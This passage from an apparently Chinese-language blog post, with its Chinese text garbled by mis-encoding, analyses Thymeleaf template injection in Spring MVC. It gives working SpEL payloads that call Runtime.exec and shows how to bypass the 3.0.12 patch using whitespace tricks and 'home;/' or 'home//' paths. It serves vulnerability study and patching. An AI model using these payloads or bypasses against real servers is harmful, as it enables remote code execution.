åˆæ¥äº†ä¸€éåˆšæ‰é‚£ä¸ªä¸‰ç›®è¿ç®—ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯åˆ¤æ–­æ˜¯å¦è¡¨è¾¾å¼é‡Œé¢åŒ…å«è¡¨è¾¾å¼</span><br>    <span class="hljs-keyword">if</span> (expression == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>	<span class="hljs-comment">// æ‰§è¡Œè¡¨è¾¾å¼çš„åœ°æ–¹</span><br>    Object result = expression.execute(context, StandardExpressionExecutionContext.RESTRICTED);<br>    strBuilder.append(result);<br>    curr = matcher.end(<span class="hljs-number">0</span>);<br>&#125; <span class="hljs-keyword">while</span>(matcher.find());<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿›ä¹‹åï¼Œæ¥åˆ°<code>org.thymeleaf.standard.expression.Expression</code>çš„ç¬¬54è¡Œ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// class  org.thymeleaf.standard.expression.Expression  execute()</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">execute</span><span class="hljs-params">(IExpressionContext context, StandardExpressionExecutionContext expContext)</span> </span>&#123;<br>    Validate.notNull(context, <span class="hljs-string">&quot;Context cannot be null&quot;</span>);	<span class="hljs-comment">// contextæ˜¯å¦ä¸ºç©º</span><br>    IStandardVariableExpressionEvaluator variableExpressionEvaluator = StandardExpressions.getVariableExpressionEvaluator(context.getConfiguration());	<span class="hljs-comment">// è·å–è¡¨è¾¾å¼è§£æå¼•æ“ï¼Œæ­¤å¤„ä¸ºSpringEL</span><br>    Object result = execute(context, <span class="hljs-keyword">this</span>, variableExpressionEvaluator, expContext);	<span class="hljs-comment">// æ‰§è¡Œï¼Œç»§ç»­è·Ÿè¿›</span><br>    <span class="hljs-keyword">return</span> LiteralValue.unwrap(result);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A514.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°ç¬¬40è¡Œï¼Œåˆ¤æ–­è¡¨è¾¾å¼æ˜¯å¦ä¸ºç®€å•çš„è¡¨è¾¾å¼ã€ä¹Ÿå°±æ˜¯Thymeleafä¸­å¸¸ç”¨çš„é‚£å‡ ä¸ªã€‘</p>
<p>è·Ÿè¿›<code>SimpleExpression.executeSimple(context, (SimpleExpression)expression, expressionEvaluator, expContext);</code></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A515.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°<code>org.thymeleaf.standard.expression.SimpleExpression</code>çš„ç¬¬20è¡Œï¼Œåˆ¤æ–­ä¼ å…¥çš„ä¸ºä½•ç§è¡¨è¾¾å¼ç±»å‹ï¼Œç„¶åæ ¹æ®ä¼ å…¥è¿›è¡Œé€‰æ‹©ï¼Œç»§ç»­è·Ÿè¿›</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A516.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°<code>org.thymeleaf.standard.expression.VariableExpression</code>ç¬¬74è¡Œï¼Œèµ°åˆ°79è¡Œ</p>
<p>expressionEvaluatorä¸ºè·å–åˆ°çš„è¡¨è¾¾å¼è§£æå™¨</p>
<p>expressionä¸ºä¼ å…¥çš„å€¼ã€ç»è¿‡ä¸€ç³»åˆ—å¤„ç†çš„å€¼ã€‘</p>
<p>ç»§ç»­è·Ÿè¿›</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A517.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°<code>org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator</code>ç¬¬20è¡Œï¼Œå•æ­¥å‘ä¸‹</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A518.png" srcset="/img/loading.gif" lazyload></p>
<p>ç»§ç»­å‘ä¸‹ï¼Œèµ°åˆ°ç¬¬90è¡Œ</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A519.png" srcset="/img/loading.gif" lazyload></p>
<p>å†å¾€ä¸‹å°±æ˜¯SpringELè¡¨è¾¾å¼çš„ä¸œè¥¿äº†ï¼Œå°±ä¸æ˜¯æˆ‘èƒ½çœ‹æ‡‚çš„äº†ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸ç»§ç»­å‘ä¸‹è·Ÿäº†ï¼Œåˆ°è¿™é‡ŒåŸºæœ¬ä¸Šç®—æ˜¯Thymeleafçš„ä¸œè¥¿è·Ÿå®Œäº†ï¼Œæ‰§è¡Œä¸€ä¸‹</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A520.png" srcset="/img/loading.gif" lazyload></p>
<p>ç®€å•æ€»ç»“ä¸€ä¸‹</p>
<p>1.è·å–ViewAndModleå¯¹è±¡</p>
<p>2.æ ¹æ®Viewé€‰æ‹©æœ€ä¼˜è§†å›¾è§£æå™¨è¿›è¡Œrender()</p>
<p>3.è¿›å…¥Thymeleafè§†å›¾è§£æå™¨ä¹‹åï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>::</code>ï¼Œå­˜åœ¨çš„è¯åˆ™è¿›è¡Œè¡¨è¾¾å¼çš„å¤„ç†</p>
<p>4.åœ¨åˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>_</code>ï¼Œå­˜åœ¨åˆ™è®¤ä¸ºæ˜¯æœ‰éœ€è¦é¢„å¤„ç†çš„è¯­å¥</p>
<p>5.æ ¹æ®ä¼ å…¥å†…å®¹ï¼Œé€‰æ‹©ç›¸åº”çš„è¡¨è¾¾å¼å¤„ç†å™¨</p>
<p>6.æ‰§è¡ŒSpringELè¡¨è¾¾å¼</p>
<h4 id="åœºæ™¯2"><a href="#åœºæ™¯2" class="headerlink" title="åœºæ™¯2"></a>åœºæ™¯2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">()</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™ç§åœºæ™¯ä¸‹ï¼Œå…¶å®ç°çš„åŸç†åŸºæœ¬æ˜¯ç›¸åŒçš„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯expéœ€è¦æ”¹å˜ä¸€ä¸‹ï¼Œéœ€è¦åœ¨åŸæœ¬çš„expæœ€ååŠ ä¸Šä¸€ä¸ª.</p>
<p>expï¼š<code>::__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__.</code></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A522.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿™æ˜¯å› ä¸ºspringMVCåœ¨æ¥æ”¶åˆ°æ­¤ç±»è¯·æ±‚æ—¶ï¼Œä¼šå¯¹åœ°å€è¿›è¡Œä¸€ä¸ªå¤„ç†ï¼Œä¼šå°†æœ€åä¸€ä¸ªç‚¹<code>.</code>ä¹‹åçš„æ•°æ®è£å‰ªæ‰</p>
<p>è¿˜æ˜¯<code>DispatcherServlet</code>ä¸­ha.handlerå¤„ä¸‹æ–­ï¼Œæ¥åˆ°ç¬¬509è¡Œå¤„ï¼Œè·Ÿè¿›</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A523.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°<code>applyDefaultViewName</code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ç¬¬536è¡Œ</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A524.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°ï¼Œæ­¤å¤„æ²¡æœ‰è¿›è¡Œå¤„ç†ï¼Œç»§ç»­è·Ÿè¿›å°±å®Œäº†</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A525.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°<code>org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator</code>ï¼Œç»§ç»­è·Ÿè¿›ç¬¬72è¡Œ</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A526.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°<code>transformPath()</code></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A527.png" srcset="/img/loading.gif" lazyload></p>
<p><code>stripFilenameExtension()</code>è¯¦æƒ…å¦‚ä¸‹ï¼Œå°±æ˜¯å°†æœ€åä¸€ä¸ªç‚¹<code>.</code>ä»¥åŠè¯¥ç‚¹ä¹‹åçš„å†…å®¹è£å‰ªæ‰</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">stripFilenameExtension</span><span class="hljs-params">(String path)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> extIndex = path.lastIndexOf(<span class="hljs-number">46</span>);		<span class="hljs-comment">// 46å¯¹åº”ASCIIç ä¸­çš„ . </span><br>    <span class="hljs-keyword">if</span> (extIndex == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> path;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">int</span> folderIndex = path.lastIndexOf(<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">return</span> folderIndex &gt; extIndex ? path : path.substring(<span class="hljs-number">0</span>, extIndex);	<span class="hljs-comment">// è£å‰ª</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œexpéœ€è¦å˜å½¢çš„åœ°æ–¹å°±é€šé€äº†ï¼Œä¸€è·¯è¿”å›åˆ°<code>DispatcherServlet</code>çš„509è¡Œå°±okï¼Œå†ç„¶åå°±å’Œåœºæ™¯1ç›¸åŒäº†</p>
<h3 id="0x04-ä¿®å¤æ–¹æ¡ˆ"><a href="#0x04-ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="0x04 ä¿®å¤æ–¹æ¡ˆ"></a>0x04 ä¿®å¤æ–¹æ¡ˆ</h3><h4 id="1-å‡çº§æ–°ç‰ˆ"><a href="#1-å‡çº§æ–°ç‰ˆ" class="headerlink" title="1.å‡çº§æ–°ç‰ˆ"></a>1.å‡çº§æ–°ç‰ˆ</h4><p>æ­¤å¤„å¤ç°æ—¶é€‰ç”¨çš„thymeleafç‰ˆæœ¬æ˜¯3.0.11ï¼Œåˆ°ç›®å‰ä¸ºæ­¢å·²ç»æœ‰äº†æœ‰äº†3.0.15</p>
<h5 id="3-0-12-åœºæ™¯1ç»•è¿‡"><a href="#3-0-12-åœºæ™¯1ç»•è¿‡" class="headerlink" title="3.0.12 åœºæ™¯1ç»•è¿‡"></a>3.0.12 åœºæ™¯1ç»•è¿‡</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Thymeleaf3.0.12å®˜æ–¹ä¿®å¤äº†è¯¥é—®ï¼Œä½†ä»å­˜åœ¨ç»•è¿‡çš„å¯èƒ½æ€§ï¼Œæ•…è¿™é‡Œè¯´ä¸€ä¸‹</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A538.png" srcset="/img/loading.gif" lazyload></p>
<p>æ›´æ”¹ä¸‹pomæ–‡ä»¶ï¼Œåˆ·æ–°ä¸€ä¸‹</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.12.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A537.png" srcset="/img/loading.gif" lazyload></p>
<p>ç›´æ¥æ¥åˆ°<code>org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator</code>çš„ç¬¬156è¡Œ</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A539.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// éœ€è¦è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªfalseï¼Œè¿™æ ·å°±ä¸ä¼šæŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">containsSpELInstantiationOrStatic</span><span class="hljs-params">(String expression)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> explen = expression.length();<br>    <span class="hljs-keyword">int</span> n = explen;		<span class="hljs-comment">// è¡¨è¾¾å¼é•¿åº¦</span><br>    <span class="hljs-keyword">int</span> ni = <span class="hljs-number">0</span>;			<br>    <span class="hljs-keyword">int</span> si = -<span class="hljs-number">1</span>;<br>	<br>    <span class="hljs-keyword">while</span>(n-- != <span class="hljs-number">0</span>) &#123;	<span class="hljs-comment">// ä»å³å¾€å·¦éå†</span><br>        <span class="hljs-keyword">char</span> c = expression.charAt(n);	<span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æœ‰wenï¼Œä¹Ÿå°±æ˜¯newçš„å€’å™</span><br>        <span class="hljs-keyword">if</span> (ni &gt;= NEW_LEN || c != NEW_ARRAY[ni] || ni &lt;= <span class="hljs-number">0</span> &amp;&amp; (n + <span class="hljs-number">1</span> &gt;= explen || !Character.isWhitespace(expression.charAt(n + <span class="hljs-number">1</span>)))) &#123;<br>            <span class="hljs-keyword">if</span> (ni &gt; <span class="hljs-number">0</span>) &#123;<br>                n += ni;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (si &lt; n) &#123;<br>                    si = -<span class="hljs-number">1</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                    si = n;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// åˆ¤æ–­(å·¦è¾¹æ˜¯å¦ä¸ºT,Tæ˜¯å¦ä¸ºè¡¨è¾¾å¼é¦–å­—æ¯</span><br>                    <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; c == <span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; n - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; expression.charAt(n - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;T&#x27;</span> &amp;&amp; (n - <span class="hljs-number">1</span> == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">2</span>)))) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; !Character.isJavaIdentifierPart(c) &amp;&amp; c != <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>                        si = -<span class="hljs-number">1</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            ++ni;<br>            <span class="hljs-keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">1</span>)))) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¯¥æ®µä»£ç å°±æ˜¯åšäº†ä¸¤ä¸ªåˆ¤æ–­</p>
<ul>
<li>ä¸èƒ½åŒ…å«new</li>
<li><code>(</code>å·¦è¾¹ä¸èƒ½ä¸ºT</li>
</ul>
<p>å½“æ»¡è¶³è¿™äº›æ¡ä»¶æ—¶ä¼šè¿”å›<code>true</code>ï¼Œå¯¼è‡´ç›´æ¥æŠ›å‡ºå¼‚å¸¸</p>
<p>æƒ³è¦ç»•è¿‡çš„è¯éœ€è¦æ»¡è¶³ï¼š</p>
<blockquote>
<p>1.ä¸èƒ½æœ‰newï¼Œæ‰€ä»¥expä¸­ä¸èƒ½æœ‰new</p>
<p>2.<code>(</code>å·¦è¾¹çš„å­—ç¬¦ä¸èƒ½ä¸ºTï¼Œæ‰€ä»¥éœ€è¦åœ¨<code>(</code>å·¦è¾¹å¢åŠ ä¸€äº›å…¶ä»–å­—ç¬¦ä¸å½±å“è¯­å¥çš„å­—ç¬¦</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ­¤å¤„ç”±äºä½¿ç”¨çš„æ˜¯postä¼ å‚ï¼Œæ‰€ä»¥æˆ‘èƒ½åˆ—ä¸¾å‡ºæ¥çš„å¦‚ä¸‹</span><br><span class="hljs-comment">// 1.å¢åŠ ç©ºæ ¼</span><br>__$&#123;T (java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br><span class="hljs-comment">// 2.åˆ¶è¡¨ç¬¦</span><br>__$&#123;T	(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br><span class="hljs-comment">// 3.æ¢è¡Œç¬¦</span><br>__$&#123;T<br>(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A540.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="3-0-12-åœºæ™¯2ç»•è¿‡"><a href="#3-0-12-åœºæ™¯2ç»•è¿‡" class="headerlink" title="3.0.12 åœºæ™¯2ç»•è¿‡"></a>3.0.12 åœºæ™¯2ç»•è¿‡</h5><p>è¿™ä¸ªåœºæ™¯æ˜¯åœ¨<a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">panda</a>è¿™ä½å¸ˆå‚…çš„æ–‡ç« ä¸Šå­¦åˆ°çš„ï¼Œå‘å¸ˆå‚…è‡´æ•¬</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// controller è§†å›¾åç§°åŒ…å«åœ¨URLçš„è·¯å¾„æˆ–å‚æ•°ä¸­</span><br><span class="hljs-meta">@GetMapping(&quot;/home/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest03</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;home/&quot;</span> + path;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å½“æ­¤ç§åœºæ™¯æ—¶ï¼Œä¸Šè¿°çš„expæ˜¯æ— æ³•å®ç°çš„</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A541.png" srcset="/img/loading.gif" lazyload></p>
<p>æ˜¯å› ä¸ºåœ¨3.0.12æ–°å¢äº†SpringRequestUtils.javaè¯¥ç±»ï¼Œå½“<em>è§†å›¾çš„åå­—å’Œ path ä¸€è‡´</em>ä¼šç»è¿‡è¯¥ç±»çš„</p>
<p><code>checkViewNameNotInRequest()</code>æ–¹æ³•è¿›è¡Œæ£€æµ‹</p>
<p>è¯¥æ–¹æ³•æ˜¯åœ¨<code>org.thymeleaf.spring5.view.ThymeleafView</code>ç¬¬106è¡Œæ—¶è¿›è¡Œè°ƒç”¨</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A542.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">checkViewNameNotInRequest</span><span class="hljs-params">(String viewName, HttpServletRequest request)</span> </span>&#123;<br>    String vn = StringUtils.pack(viewName);<br>    String requestURI = StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br>    <span class="hljs-keyword">boolean</span> found = requestURI != <span class="hljs-keyword">null</span> &amp;&amp; requestURI.contains(vn);	<br>    	<span class="hljs-comment">// URIä¸ä¸ºç©ºæ—¶ï¼ŒURIä¸­åŒ…å«è§†å›¾åæ—¶ foundä¸ºtrue</span><br>    <span class="hljs-keyword">if</span> (!found) &#123;<br>        Enumeration paramNames = request.getParameterNames();<br><br>        <span class="hljs-keyword">while</span>(!found &amp;&amp; paramNames.hasMoreElements()) &#123;<br>            String[] paramValues = request.getParameterValues((String)paramNames.nextElement());<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; ++i) &#123;<br>                String paramValue = StringUtils.pack(UriEscape.unescapeUriQueryParam(paramValues[i]));<br>                <span class="hljs-keyword">if</span> (paramValue.contains(vn)) &#123;	<span class="hljs-comment">// å¦‚æœå‚æ•°å€¼ä¸­åŒ…å«ViewNameä¹ŸæŠ›å‡ºå¼‚å¸¸</span><br>                    found = <span class="hljs-keyword">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (found) &#123;	<span class="hljs-comment">// æŠ›å‡ºå¼‚å¸¸</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TemplateProcessingException(<span class="hljs-string">&quot;View name is an executable expression, and it is present in a literal manner in request path or parameters, which is forbidden for security reasons.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å› æ­¤æƒ³è¦ç»•è¿‡ï¼Œåˆ™éœ€è¦<code>requestURI.contains(vn)</code>å€¼ä¸ºå‡ï¼Œå…·ä½“åˆ†æè¿‡ç¨‹å‚è€ƒå¸ˆå‚…çš„æ–‡ç« ï¼Œåœ¨æ­¤å°±ä¸è¯´äº†ï¼Œç›´æ¥æ”¾ä¸ŠEXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">home<span class="hljs-comment">//__$&#123;T (java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)&#125;__::.x</span><br>home;/__$&#123;T (java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br></code></pre></td></tr></table></figure>

<blockquote>
<p>exp2:</p>
<p>SpringBoot æœ‰ä¸€ä¸ªåŠŸèƒ½å«åšçŸ©é˜µå˜é‡ï¼Œé»˜è®¤æ˜¯ç¦ç”¨çŠ¶æ€ï¼š</p>
